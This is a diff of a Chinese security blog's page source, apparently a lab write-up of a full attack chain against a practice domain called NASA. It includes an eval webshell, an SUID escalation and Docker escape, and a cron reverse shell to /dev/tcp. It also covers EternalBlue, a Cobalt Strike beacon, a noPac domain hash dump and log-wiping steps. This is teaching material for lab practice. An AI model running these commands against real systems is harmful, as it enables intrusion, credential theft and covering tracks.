@@ -6,71 +6,32 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="index, follow">
 <title>从外网打点到渗透内网域控 NASA | Doraemon0358 的安全实验室</title>
-<meta name="keywords" content="域渗透, noPac, EternalBlue, 内网穿透">
-<meta name="description" content="目标环境
-
-  
-      
-          主机名
-          外网 IP
-          内网 IP
-          账号
-          密码
-      
-  
-  
-      
-          ubuntu
-          192.168.59.138
-          -
-          ubuntu
-          QWEasd444
-      
-      
-          win2003
-          192.168.59.144
-          10.10.10.137
-          administrator
-          admin555
-      
-      
-          win7
-          192.168.59.197
-          10.10.10.142
-          win7
-          admin555
-      
-      
-          19server-01
-          -
-          10.10.10.140
-          nasa\administrator
-          QWEasd.123
-      
-      
-          19server-02
-          -
-          10.10.10.141
-          nasa\administrator
-          QWEasd.123
-      
-      
-          域用户
-          -
-          -
-          nasa\test
-          QWEasd!@#999
-      
-  
-
-1. 外网打点
-
-使用 nmap、fscan 进行端口和服务扫描。
-目录扫描发现后台入口 /admin/webadmin.php。
-题目名称含 “nasa”，生成针对性字典成功爆破后台密码 nasa123。
-
-2. 获取 WebShell（代码注入）
-目标站点为逍遥商城系统，安装向导文件 install/index.php 在未安装（install/install.lock 不存在）时存在严重漏洞。">
+<meta name="keywords" content="域渗透, noPac, EternalBlue, 内网穿透, Docker逃逸, SUID提权">
+<meta name="description" content="                   ┌─────────────────┐
+                   │     Ubuntu      │
+                   │ 192.168.226.158 │
+                   └─────────────────┘
+                             │
+               ┌─────────────┼─────────────┐
+               │                           │
+               ▼                           ▼
+   ┌────────────────────┐      ┌────────────────────┐
+   │      win2003       │      │       win7         │
+   │ 192.168.174.136    │      │ 192.168.174.135    │
+   │ 10.10.10.137       │      │ 10.10.10.142       │
+   └────────────────────┘      └────────────────────┘
+                                        │
+                                        ▼
+                 ┌───────────────────────┴───────────────────────┐
+                 │                                               │
+                 ▼                                               ▼
+   ┌─────────────────────────┐                   ┌─────────────────────────┐
+   │     19server-ad01       │                   │     19server-ad02       │
+   │     10.10.10.140        │                   │     10.10.10.139        │
+   └─────────────────────────┘                   └─────────────────────────┘
+外网打点
+目录扫描
+http://192.168.226.161/admin/">
 <meta name="author" content="偶记">
 <link rel="canonical" href="https://Doraemon0358.github.io/posts/%E4%BB%8E%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9%E5%88%B0%E5%9F%9F%E6%8E%A7-nasa%E9%9D%B6%E5%9C%BA/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.9e010bc22ef5794c0560b82f657f315607f24d8b05e0088e95b900c22246f5c0.css" integrity="sha256-ngELwi71eUwFYLgvZX8xVgfyTYsF4AiOlbkAwiJG9cA=" rel="preload stylesheet" as="style">
@@ -130,7 +91,7 @@
 </script><meta property="og:url" content="https://Doraemon0358.github.io/posts/%E4%BB%8E%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9%E5%88%B0%E5%9F%9F%E6%8E%A7-nasa%E9%9D%B6%E5%9C%BA/">
   <meta property="og:site_name" content="Doraemon0358 的安全实验室">
   <meta property="og:title" content="从外网打点到渗透内网域控 NASA">
-  <meta property="og:description" content="目标环境 主机名 外网 IP 内网 IP 账号 密码 ubuntu 192.168.59.138 - ubuntu QWEasd444 win2003 192.168.59.144 10.10.10.137 administrator admin555 win7 192.168.59.197 10.10.10.142 win7 admin555 19server-01 - 10.10.10.140 nasa\administrator QWEasd.123 19server-02 - 10.10.10.141 nasa\administrator QWEasd.123 域用户 - - nasa\test QWEasd!@#999 1. 外网打点 使用 nmap、fscan 进行端口和服务扫描。 目录扫描发现后台入口 /admin/webadmin.php。 题目名称含 “nasa”，生成针对性字典成功爆破后台密码 nasa123。 2. 获取 WebShell（代码注入） 目标站点为逍遥商城系统，安装向导文件 install/index.php 在未安装（install/install.lock 不存在）时存在严重漏洞。">
+  <meta property="og:description" content="┌─────────────────┐ │ Ubuntu │ │ 192.168.226.158 │ └─────────────────┘ │ ┌─────────────┼─────────────┐ │ │ ▼ ▼ ┌────────────────────┐ ┌────────────────────┐ │ win2003 │ │ win7 │ │ 192.168.174.136 │ │ 192.168.174.135 │ │ 10.10.10.137 │ │ 10.10.10.142 │ └────────────────────┘ └────────────────────┘ │ ▼ ┌───────────────────────┴───────────────────────┐ │ │ ▼ ▼ ┌─────────────────────────┐ ┌─────────────────────────┐ │ 19server-ad01 │ │ 19server-ad02 │ │ 10.10.10.140 │ │ 10.10.10.139 │ └─────────────────────────┘ └─────────────────────────┘ 外网打点 目录扫描 http://192.168.226.161/admin/">
   <meta property="og:locale" content="zh_cn">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
@@ -140,10 +101,12 @@
     <meta property="article:tag" content="NoPac">
     <meta property="article:tag" content="EternalBlue">
     <meta property="article:tag" content="内网穿透">
+    <meta property="article:tag" content="Docker逃逸">
+    <meta property="article:tag" content="SUID提权">
 
   <meta name="twitter:card" content="summary">
   <meta name="twitter:title" content="从外网打点到渗透内网域控 NASA">
-  <meta name="twitter:description" content="目标环境 主机名 外网 IP 内网 IP 账号 密码 ubuntu 192.168.59.138 - ubuntu QWEasd444 win2003 192.168.59.144 10.10.10.137 administrator admin555 win7 192.168.59.197 10.10.10.142 win7 admin555 19server-01 - 10.10.10.140 nasa\administrator QWEasd.123 19server-02 - 10.10.10.141 nasa\administrator QWEasd.123 域用户 - - nasa\test QWEasd!@#999 1. 外网打点 使用 nmap、fscan 进行端口和服务扫描。 目录扫描发现后台入口 /admin/webadmin.php。 题目名称含 “nasa”，生成针对性字典成功爆破后台密码 nasa123。 2. 获取 WebShell（代码注入） 目标站点为逍遥商城系统，安装向导文件 install/index.php 在未安装（install/install.lock 不存在）时存在严重漏洞。">
+  <meta name="twitter:description" content="┌─────────────────┐ │ Ubuntu │ │ 192.168.226.158 │ └─────────────────┘ │ ┌─────────────┼─────────────┐ │ │ ▼ ▼ ┌────────────────────┐ ┌────────────────────┐ │ win2003 │ │ win7 │ │ 192.168.174.136 │ │ 192.168.174.135 │ │ 10.10.10.137 │ │ 10.10.10.142 │ └────────────────────┘ └────────────────────┘ │ ▼ ┌───────────────────────┴───────────────────────┐ │ │ ▼ ▼ ┌─────────────────────────┐ ┌─────────────────────────┐ │ 19server-ad01 │ │ 19server-ad02 │ │ 10.10.10.140 │ │ 10.10.10.139 │ └─────────────────────────┘ └─────────────────────────┘ 外网打点 目录扫描 http://192.168.226.161/admin/">
 
 
 <script type="application/ld+json">
@@ -172,12 +135,12 @@
   "@type": "BlogPosting",
   "headline": "从外网打点到渗透内网域控 NASA",
   "name": "从外网打点到渗透内网域控 NASA",
-  "description": "目标环境 主机名 外网 IP 内网 IP 账号 密码 ubuntu 192.168.59.138 - ubuntu QWEasd444 win2003 192.168.59.144 10.10.10.137 administrator admin555 win7 192.168.59.197 10.10.10.142 win7 admin555 19server-01 - 10.10.10.140 nasa\\administrator QWEasd.123 19server-02 - 10.10.10.141 nasa\\administrator QWEasd.123 域用户 - - nasa\\test QWEasd!@#999 1. 外网打点 使用 nmap、fscan 进行端口和服务扫描。 目录扫描发现后台入口 /admin/webadmin.php。 题目名称含 “nasa”，生成针对性字典成功爆破后台密码 nasa123。 2. 获取 WebShell（代码注入） 目标站点为逍遥商城系统，安装向导文件 install/index.php 在未安装（install/install.lock 不存在）时存在严重漏洞。\n",
+  "description": " ┌─────────────────┐ │ Ubuntu │ │ 192.168.226.158 │ └─────────────────┘ │ ┌─────────────┼─────────────┐ │ │ ▼ ▼ ┌────────────────────┐ ┌────────────────────┐ │ win2003 │ │ win7 │ │ 192.168.174.136 │ │ 192.168.174.135 │ │ 10.10.10.137 │ │ 10.10.10.142 │ └────────────────────┘ └────────────────────┘ │ ▼ ┌───────────────────────┴───────────────────────┐ │ │ ▼ ▼ ┌─────────────────────────┐ ┌─────────────────────────┐ │ 19server-ad01 │ │ 19server-ad02 │ │ 10.10.10.140 │ │ 10.10.10.139 │ └─────────────────────────┘ └─────────────────────────┘ 外网打点 目录扫描 http://192.168.226.161/admin/\n",
   "keywords": [
-    "域渗透", "noPac", "EternalBlue", "内网穿透"
+    "域渗透", "noPac", "EternalBlue", "内网穿透", "Docker逃逸", "SUID提权"
   ],
-  "articleBody": "目标环境 主机名 外网 IP 内网 IP 账号 密码 ubuntu 192.168.59.138 - ubuntu QWEasd444 win2003 192.168.59.144 10.10.10.137 administrator admin555 win7 192.168.59.197 10.10.10.142 win7 admin555 19server-01 - 10.10.10.140 nasa\\administrator QWEasd.123 19server-02 - 10.10.10.141 nasa\\administrator QWEasd.123 域用户 - - nasa\\test QWEasd!@#999 1. 外网打点 使用 nmap、fscan 进行端口和服务扫描。 目录扫描发现后台入口 /admin/webadmin.php。 题目名称含 “nasa”，生成针对性字典成功爆破后台密码 nasa123。 2. 获取 WebShell（代码注入） 目标站点为逍遥商城系统，安装向导文件 install/index.php 在未安装（install/install.lock 不存在）时存在严重漏洞。\n利用思路：\n访问 http://target/install/index.php 进入安装界面。 在数据库配置环节注入一句话木马：xy_’);eval($_POST[‘cmd’])（利用 SQL 拼接构造恶意 config.php）。 删除 install/install.lock 文件（任意文件删除漏洞或手动操作）。 蚁剑连接后门：http://192.168.178.140/config.php。 关键代码片段（install/index.php）：\nPHP\nif ($result) { // ... 省略 $config = \"\u003c?php\\n\" . \"\\$pe['db_host'] = '{$_p_db_host}';\\n\" // ... . \"define('dbpre', '{$_p_dbpre}');\\n\" . \"?\u003e\"; file_put_contents(\"{$pe['path_root']}config.php\", $config); } 3. Linux 提权 上传 LinEnum.sh 进行本地枚举。\n关键发现：\n当前用户为 www-data。 主机实际运行在 Docker 容器 中（/ .dockerenv）。 存在 SUID 文件 /usr/bin/find（可利用但受 Docker 限制）。 MySQL root 密码为空，可直接登录。 提权受限，最终选择横向移动至 Windows 内网。 4. 内网横向渗透 4.1 Win7（192.168.59.197 / 10.10.10.142）—— EternalBlue (MS17-010) 使用 Metasploit exploit/windows/smb/ms17_010_eternalblue 直接打出 SYSTEM 权限 Meterpreter：\nBash\nmsf \u003e use exploit/windows/smb/ms17_010_eternalblue msf \u003e set RHOSTS 192.168.226.197 msf \u003e exploit 成功后：\nautoroute 添加内网路由 10.10.10.0/24。 启动 SOCKS5 代理（auxiliary/server/socks_proxy）。 proxychains4 穿透后续扫描。 4.2 Win2003（192.168.59.144 / 10.10.10.137）—— MS17-010 使用 auxiliary/admin/smb/ms17_010_command 执行命令：\nBash\n# 下载木马（VBS 一行命令） set COMMAND \"echo dim xHttp... \u003e dl.vbs \u0026\u0026 cscript dl.vbs \u0026\u0026 del dl.vbs\" run # 执行木马 set COMMAND \"start /b C:\\Windows\\Temp\\muma0411.exe\" run 成功上线 SYSTEM 权限（32位木马）。\n5. 域信息收集 在 Win7 上用域用户 nasa\\test 登录，mimikatz 抓取凭证： nasa\\test : QWEasd!@#999 其他本地/域机器哈希 fscan 内网扫描确认域控 10.10.10.140（AD01）开放 445/389/636 等端口。 6. noPac（CVE-2021-42278 + CVE-2021-42287）打域控 第一步：扫描是否可利用\nBash\nproxychains4 python3 noPac.py nasa.gov/test:'QWEasd!@#999' -dc-ip 10.10.10.140 第二步：利用\nBash\nproxychains4 python3 noPac.py nasa.gov/test:'QWEasd!@#999' -dc-ip 10.10.10.140 \\ --impersonate administrator -dump 执行结果：\n成功添加临时机器账户并 spoof sAMAccountName。 获得 administrator 的 TGT（.ccache 文件）。 完整 dump 出 SAM、LSA Secrets、NTDS 所有域用户哈希和 Kerberos keys（含 krbtgt）。 注意：执行结束后会出现清理阶段的非致命报错（删除临时计算机账户失败、服务停止失败、Python Bad file descriptor），不影响已获取的票据和哈希。\n7. 痕迹清理建议（推荐） 删除临时计算机账户（最重要）：Bash export KRB5CCNAME=administrator_AD01.nasa.gov.ccache python3 -m impacket.ldap_shell nasa.gov/Administrator -dc-ip 10.10.10.140 -no-pass -k # 在 shell 中执行：delete computer WIN-1EASNY7BHEK$ 清理本地痕迹：Bash rm -f *.ccache history -c \u0026\u0026 history -w 后续持久化推荐： 使用 krbtgt hash 制作 Golden Ticket。 DCSync 持续同步哈希。 避免直接修改普通用户密码（对已拿票据无效），真正有效的防守是重置 krbtgt 密码两次 + 打补丁 + 关闭 MachineAccountQuota。 总结与收获 外网：合理利用业务系统安装向导的代码注入是最快路径。 内网：经典 MS17-010 在老系统上依然威力巨大。 域控：noPac 在 MachineAccountQuota 未限制的环境下几乎是“核弹级”利用。 工具链：Metasploit + Cobalt Strike + proxychains + noPac 配合完美。 声明：本文仅用于学习和靶场复现，请在授权环境下进行测试，严禁用于非法用途。\n",
-  "wordCount" : "1425",
+  "articleBody": " ┌─────────────────┐ │ Ubuntu │ │ 192.168.226.158 │ └─────────────────┘ │ ┌─────────────┼─────────────┐ │ │ ▼ ▼ ┌────────────────────┐ ┌────────────────────┐ │ win2003 │ │ win7 │ │ 192.168.174.136 │ │ 192.168.174.135 │ │ 10.10.10.137 │ │ 10.10.10.142 │ └────────────────────┘ └────────────────────┘ │ ▼ ┌───────────────────────┴───────────────────────┐ │ │ ▼ ▼ ┌─────────────────────────┐ ┌─────────────────────────┐ │ 19server-ad01 │ │ 19server-ad02 │ │ 10.10.10.140 │ │ 10.10.10.139 │ └─────────────────────────┘ └─────────────────────────┘ 外网打点 目录扫描 http://192.168.226.161/admin/\nhttp://192.168.226.161/install/\n./install/install.lock\n代码审计 https://www.jianshu.com/p/d5a180ebeb7e\nnday 发现任意文件删除\nadmin/module/db.php 第 168-177 行的 case ‘del’: 分支。\n代码注入\n../../install/index.php\nGetShell xy_');eval($_POST[cmd]);?\u003e//\nhttp://192.168.226.158/config.php\nSUID提权 当一个程序拥有 SUID 且 owner 是 root 时： 普通用户运行该程序时，程序会 以 root 身份执行\n上传linEnum脚本\ntouch test\nfind test -exec whoami \\;\n弹容器 Shell ┌──(root㉿kali)-[~] └─# msfvenom -p linux/x64/meterpreter/reverse_tcp \\ LHOST=192.168.226.128 \\ LPORT=6666 \\ -f elf \u003e moon.elf [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x64 from the payload ┌──(root㉿kali)-[~] └─# msfconsole Metasploit tip: Start commands with a space to avoid saving them to history msf \u003e use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf exploit(multi/handler) \u003e set payload linux/x64/meterpreter/reverse_tcp payload =\u003e linux/x64/meterpreter/reverse_tcp msf exploit(multi/handler) \u003e set LHOST 192.168.226.128 LHOST =\u003e 192.168.226.128 msf exploit(multi/handler) \u003e set LPORT 6666 LPORT =\u003e 6666 msf exploit(multi/handler) \u003e run # 监听已开启，等待靶机运行马子即可上线 [*] Started reverse TCP handler on 192.168.226.128:6666 [*] Sending stage (3090404 bytes) to 192.168.178.140 [*] Meterpreter session 1 opened (192.168.226.128:6666 -\u003e 192.168.178.140:52464) at 2026-03-11 13:51:56 -0400 meterpreter \u003e getuid Server username: root meterpreter \u003e shell 进入靶机终端 想回到 Meterpreter 就直接输入 exit 把elf马子传上来 chmod +x moon.elf touch test find test -exec ./moon.elf \\; Docker 逃逸 ls /.dockerenv\n把宿主机的硬盘（文件系统）挂载到容器里的一个目录，然后通过 chroot 把这个目录变成容器的\"新根目录\"\n┌──(root㉿kali)-[~] └─# nc -lnvp 8888 listening on [any] 8888 ... connect to [192.168.226.128] from (UNKNOWN) [192.168.226.129] 55464 bash: 无法设定终端进程组(3231): 对设备不适当的 ioctl 操作 bash: 此 shell 中无任务控制 root@ubuntu-virtual-machine:~# ls meterpreter \u003e shell Process 107 created. Channel 5 created. // 添加 root 权限用户，为什么要新增新用户？ openssl passwd -1 -salt pingan pingan0409!!! $1$pingan$l0v7nyxHDOuitwybLvvZ4. echo 'pingan:$1$pingan$l0v7nyxHDOuitwybLvvZ4.:0:0:root:/root:/bin/bash' \u003e\u003e /etc/passwd // 创建交互式shell，切换到新用户pingan python -c 'import pty; pty.spawn(\"/bin/bash\")' bash-4.3$ su pingan su pingan Password: pingan0409!!! // 通过挂载进行 docker 逃逸 // 创建目录 root@683a11bdee30:/app/install# mkdir /pingantest mkdir /pingantest // 将宿主的目录挂载到新目录 root@683a11bdee30:/app/install# mount /dev/sda1 /pingantest mount /dev/sda1 /pingantest // 改变根目录 root@683a11bdee30:/app/install# chroot /pingantest chroot /pingantest // 反弹shell root@683a11bdee30:/# echo '/bin/bash -i \u003e\u0026 bash -i \u003e\u0026/dev/tcp/192.168.226.128/8888 0\u003e\u00261' \u003e /tmp/sec.sh \u0026\u0026 chmod +x /tmp/sec.sh \u0026\u0026 cat /tmp/sec.sh \u0026\u0026 echo '*/1 * * * * root bash /tmp/sec.sh' \u003e\u003e/etc/crontab \u003c '*/1 * * * * root bash /tmp/sec.sh' \u003e\u003e/etc/crontab /bin/bash -i \u003e\u0026 bash -i \u003e\u0026/dev/tcp/192.168.226.128/8888 0\u003e\u00261 root@683a11bdee30:/# 内网渗透 内网信息收集 ./fscan -h 192.168.226.0/24 -np -no -nopoc\nwin7 ┌──(root㉿kali)-[~] └─# msfconsole msf \u003e use exploit/windows # 只支持 x64 msf exploit(windows) \u003e set RHOSTS 192.168.226.197 msf exploit(windows) \u003e set LHOST 192.168.226.128 msf exploit(windows) \u003e set payload windows/x64/meterpreter/reverse_tcp msf exploit(windows) \u003e set VERIFY_ARCH false msf exploit(windows) \u003e set VERIFY_TARGET false msf exploit(windows) \u003e set TARGET 0 msf exploit(windows) \u003e exploit -j [*] Exploit running as background job 0. [*] Exploit completed, but no session was created. [*] Meterpreter session 1 opened (192.168.226.128:4444 -\u003e 192.168.226.197:49276) at 2026-04-09 11:42:23 -0400 [+] 192.168.226.197:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 192.168.226.197:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 192.168.226.197:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 meterpreter x64/windows NT AUTHORITY\\SYSTEM @ WIN7 192.168.226.128:4444 -\u003e 192.168.226.197:49276 (192.168.226.197) msf exploit(windows) \u003e sessions -i 1 [*] Starting interaction with 1... meterpreter \u003e sysinfo Computer : WIN7 OS : Windows 7 (6.1 Build 7601, Service Pack 1). Architecture : x64 System Language : zh_CN Domain : NASA Logged On Users : 3 Meterpreter : x64/windows meterpreter \u003e [*] 192.168.226.197 - Meterpreter session 1 closed. Reason: Died Win7（192.168.226.197）已经成功拿下 SYSTEM 权限的 Meterpreter 会话！🎉 你现在已经在 NT AUTHORITY\\SYSTEM 权限下了，这是 Windows 上最高的权限。 sysinfo # 查看系统信息 getuid # 确认权限（应该显示 SYSTEM） getpid # 查看当前进程 ipconfig # 查看靶机网络信息 pwd # 当前目录 shell # 进入 cmd 命令行（可选，后面可以 exit 回来） sessions -i id 后台会话（推荐，先切回 msf 主界面继续操作另一台）：meterpreter background 查看所有会话：msfsessions meterpreter \u003e upload /root/AAA/beacon_x64.exe C:\\\\Windows\\\\Temp\\\\beacon_x64.exe [*] Uploading : /root/beacon_x64.exe -\u003e C:\\Windows\\Temp\\beacon_x64.exe [*] Uploaded 14.00 KiB of 14.00 KiB (100.0%): /root/beacon_x64.exe -\u003e C:\\Windows\\Temp\\beacon_x64.exe [*] Completed : /root/beacon_x64.exe -\u003e C:\\Windows\\Temp\\beacon_x64.exe beacon_x64.exe dynamic_chain proxy_dns tcp_read_time_out 15000 tcp_connect_time_out 8000 [ProxyList] socks4 127.0.0.1 1080 # 添加路由部分 # autoroute 是 Meterpreter 的脚本，-s 10.10.10.0/24：告诉 Meterpreter，你希望访问这个子网。 meterpreter \u003e run autoroute -s 10.10.10.0/24 [!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute. [!] Example: run post/multi/manage/autoroute OPTION=value [...] [*] Adding a route to 10.10.10.0/255.255.255.0... [+] Added route to 10.10.10.0/255.255.255.0 via 192.168.226.197 [*] Use the -p option to list all active routes meterpreter \u003e background [*] Backgrounding session 1... # 验证：所有发送到 10.10.10.0/24 的流量会通过 Session 1 这台跳板机。 use server/socks_proxy msf auxiliary(server/socks_proxy) \u003e route print IPv4 Active Routing Table ========================= Subnet Netmask Gateway ------ ------- ------- 10.10.10.0 255.255.255.0 Session 1 # 设置 SOCKS Proxy 部分 msf auxiliary(server/socks_proxy) \u003e use auxiliary/server/socks_proxy msf auxiliary(server/socks_proxy) \u003e set VERSION 5 msf auxiliary(server/socks_proxy) \u003e set SRVHOST 127.0.0.1 msf auxiliary(server/socks_proxy) \u003e set SRVPORT 9050 msf auxiliary(server/socks_proxy) \u003e run msf auxiliary(server/socks_proxy) \u003e # 跳板建立验证，扫描网段内一个主机的445端口 ┌──(root㉿kali)-[~] └─# proxychains4 nmap -sT -Pn -n -p 445 10.10.10.140 [proxychains] config file found: /etc/proxychains4.conf [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4 Nmap scan report for 10.10.10.140 Host is up (0.072s latency). PORT STATE SERVICE 445/tcp open microsoft-ds Nmap done: 1 IP address (1 host up) scanned in 0.09 seconds 域信息收集 域用户登录win7：nasa\\test,QWEasd!@#999\nwin7：beacon\u003e logonpasswords\nbeacon执行shell ipconfig发现还有一个网段：10.10.10.0/24\n使用fscan进行探测10.10.10.0/24网段\n[04/18 19:18:15] beacon\u003e shell fscan2020.exe -h 10.10.10.0/24 -np -no [04/18 19:18:15] [*] Tasked beacon to run: fscan2020.exe -h 10.10.10.0/24 -np -no [04/18 19:18:15] [+] host called home, sent: 69 bytes [04/18 19:18:25] [+] received output: ___ _ / _ \\ ___ ___ _ __ __ _ ___| | __ / /_\\/____/ __|/ __| '__/ _` |/ __| |/ / / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u003c \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ 10.10.10.142:135 open 10.10.10.140:135 open 10.10.10.140:80 open 10.10.10.137:135 open 10.10.10.137:80 open 10.10.10.140:445 open 10.10.10.140:443 open 10.10.10.141:135 open 10.10.10.137:445 open 10.10.10.142:445 open 10.10.10.141:445 open [04/18 19:18:36] [+] received output: 10.10.10.142\tMS17-010\t(Windows 7 Ultimate 7601 Service Pack 1) NetInfo: [*]10.10.10.142 [-\u003e]win7 [-\u003e]10.10.10.142 [-\u003e]192.168.226.197 NetInfo: [*]10.10.10.140 [-\u003e]ad01 [-\u003e]10.10.10.140 NetInfo: [*]10.10.10.137 [-\u003e]win2003 [-\u003e]10.10.10.137 [-\u003e]192.168.226.144 10.10.10.137\tMS17-010\t(Windows Server 2003 3790 Service Pack 2) NetInfo: [*]10.10.10.141 [-\u003e]ad02 [-\u003e]10.10.10.141 [04/18 19:18:37] [+] received output: WebTitle:http://10.10.10.140:80 403 None WebTitle:http://10.10.10.137:80 200 None AD (noPac) CVE-2021-42278 \u0026 CVE-2021-42287 攻击域控\n第一步：扫描目标是否 vulnerable（强烈建议先扫）：\nproxychains4 python3 noPac.py nasa.gov/test:'QWEasd!@#999' -dc-ip 10.10.10.140 如果显示 vulnerable，就可以继续 exploit。\n第二步：利用 noPac 提权（常见姿势）\n获取高权限票据： proxychains4 python3 noPac.py nasa.gov/test:'QWEasd!@#999' -dc-ip 10.10.10.140 --impersonate administrator 直接拿 shell： proxychains4 python3 noPac.py Dnasa.gov/test:'QWEasd!@#999' -dc-ip 10.10.10.140 --impersonate administrator -shell Dump hash（常见目标）： proxychains4 python3 noPac.py nasa.gov/test:'QWEasd!@#999' -dc-ip 10.10.10.140 --impersonate administrator -dump ┌──(root㉿kali)-[~/noPac-main] └─# proxychains4 python noPac.py nasa.gov/test:'QWEasd!@#999' -dc-ip 10.10.10.140 -dc-host AD01 --impersonate administrator -dump [proxychains] config file found: /etc/proxychains4.conf AD01$:aes256-cts-hmac-sha1-96:5b99a71e5d0274f24153ce9c8e1d85417f6133e2403fa9a77d0015b5f7f7de09 AD01$:aes128-cts-hmac-sha1-96:8b2e6c80caea337d3d8e319fb91df611 AD01$:des-cbc-md5:d9f26d5879347fcd AD02$:aes256-cts-hmac-sha1-96:3a6d1aaa79853b28a4e0c3bffa83213c2e46513b8ab90c2d52782fc6f31115e2 AD02$:aes128-cts-hmac-sha1-96:73eb19685f294c87d6b1c89230d9b1b9 AD02$:des-cbc-md5:928c675bf40ee319 WIN7$:aes256-cts-hmac-sha1-96:21dec920ffa03eaa7ea50570dff0c1de279e37de20d07e72cd6b8ccdecfc966d WIN7$:aes128-cts-hmac-sha1-96:0d79ea7e2d31f323d8b15f70c563e3e8 WIN7$:des-cbc-md5:2fd3dcb6ba2685c2 WIN-1EASNY7BHEK$:aes256-cts-hmac-sha1-96:4952733c099698a5e14a7b10fd66598e8b4b9e8a14fd2440bfc3dda5d7f88e7e WIN-1EASNY7BHEK$:aes128-cts-hmac-sha1-96:1b973d65577282faecfcc5185019d72c WIN-1EASNY7BHEK$:des-cbc-md5:68adf132703162ae 后面那些报错都是 **noPac 工具在清理阶段** 产生的**非致命错误**，不会影响你已经拿到的 Administrator 票据（`.ccache` 文件）和完整 dump 的 hashes/keys。 ### 1. 删除机器账户失败（最常见的那个） [*] Attempting to del a computer with the name: WIN-1EASNY7BHEK$ [-] Delete computer WIN-1EASNY7BHEK$ Failed! Maybe the current user does not have permission. [*] Pls make sure your choice hostname and the -dc-ip are same machine !! **原因**：noPac 在攻击过程中临时创建了一个机器账户（WIN-1EASNY7BHEK$），用来 spoof sAMAccountName。攻击结束后尝试自动删除但清理失败。 **影响**：几乎没有影响。攻击已经成功，票据和 dump 都拿到了。 ### 2. 停止 RemoteRegistry 服务失败 **原因**：noPac 为了 dump SAM/LSA/NTDS，临时启动了目标 DC 上的 RemoteRegistry 服务。停止时发现有其他服务依赖它。 **影响**：无影响。 ### 3. Python Exception（Bad file descriptor） **原因**：impacket 库在清理 Registry 对象时的资源释放问题，属于 Python + impacket 在异常退出或网络代理环境下的\"噪音\"错误。 **影响**：完全无影响。 痕迹清理 删除临时计算机账户（最重要）：\nexport KRB5CCNAME=administrator_AD01.nasa.gov.ccache python3 -m impacket.ldap_shell nasa.gov/Administrator -dc-ip 10.10.10.140 -no-pass -k # 在 shell 中执行：delete computer WIN-1EASNY7BHEK$ 清理本地痕迹：\nrm -f *.ccache history -c \u0026\u0026 history -w 后续持久化推荐：\n使用 krbtgt hash 制作 Golden Ticket。 DCSync 持续同步哈希。 避免直接修改普通用户密码（对已拿票据无效），真正有效的防守是重置 krbtgt 密码两次 + 打补丁 + 关闭 MachineAccountQuota。 声明：本文仅用于学习和靶场复现，请在授权环境下进行测试，严禁用于非法用途。\n",
+  "wordCount" : "2790",
   "inLanguage": "en",
   "datePublished": "2026-04-25T22:00:00+08:00",
   "dateModified": "2026-04-25T22:00:00+08:00",
@@ -279,204 +242,397 @@
         <span class="title">Table of Contents</span>
     </summary>
 
-    <div class="inner"><ul>
+    <div class="inner"><ul><ul>
             <li>
-                <a href="#%e7%9b%ae%e6%a0%87%e7%8e%af%e5%a2%83" aria-label="目标环境">目标环境</a></li>
-            <li>
-                <a href="#1-%e5%a4%96%e7%bd%91%e6%89%93%e7%82%b9" aria-label="1. 外网打点">1. 外网打点</a></li>
-            <li>
-                <a href="#2-%e8%8e%b7%e5%8f%96-webshell%e4%bb%a3%e7%a0%81%e6%b3%a8%e5%85%a5" aria-label="2. 获取 WebShell（代码注入）">2. 获取 WebShell（代码注入）</a></li>
-            <li>
-                <a href="#3-linux-%e6%8f%90%e6%9d%83" aria-label="3. Linux 提权">3. Linux 提权</a></li>
-            <li>
-                <a href="#4-%e5%86%85%e7%bd%91%e6%a8%aa%e5%90%91%e6%b8%97%e9%80%8f" aria-label="4. 内网横向渗透">4. 内网横向渗透</a><ul>
+                <a href="#%e5%a4%96%e7%bd%91%e6%89%93%e7%82%b9" aria-label="外网打点">外网打点</a><ul>
                     
             <li>
-                <a href="#41-win719216859197--101010142-eternalblue-ms17-010" aria-label="4.1 Win7（192.168.59.197 / 10.10.10.142）—— EternalBlue (MS17-010)">4.1 Win7（192.168.59.197 / 10.10.10.142）—— EternalBlue (MS17-010)</a></li>
+                <a href="#%e7%9b%ae%e5%bd%95%e6%89%ab%e6%8f%8f" aria-label="目录扫描">目录扫描</a></li>
             <li>
-                <a href="#42-win200319216859144--101010137-ms17-010" aria-label="4.2 Win2003（192.168.59.144 / 10.10.10.137）—— MS17-010">4.2 Win2003（192.168.59.144 / 10.10.10.137）—— MS17-010</a></li></ul>
+                <a href="#%e4%bb%a3%e7%a0%81%e5%ae%a1%e8%ae%a1" aria-label="代码审计">代码审计</a></li>
+            <li>
+                <a href="#getshell" aria-label="GetShell">GetShell</a></li></ul>
             </li>
             <li>
-                <a href="#5-%e5%9f%9f%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86" aria-label="5. 域信息收集">5. 域信息收集</a></li>
+                <a href="#suid%e6%8f%90%e6%9d%83" aria-label="SUID提权">SUID提权</a></li>
             <li>
-                <a href="#6-nopaccve-2021-42278--cve-2021-42287%e6%89%93%e5%9f%9f%e6%8e%a7" aria-label="6. noPac（CVE-2021-42278 &#43; CVE-2021-42287）打域控">6. noPac（CVE-2021-42278 + CVE-2021-42287）打域控</a></li>
+                <a href="#%e5%bc%b9%e5%ae%b9%e5%99%a8-shell" aria-label="弹容器 Shell">弹容器 Shell</a></li>
             <li>
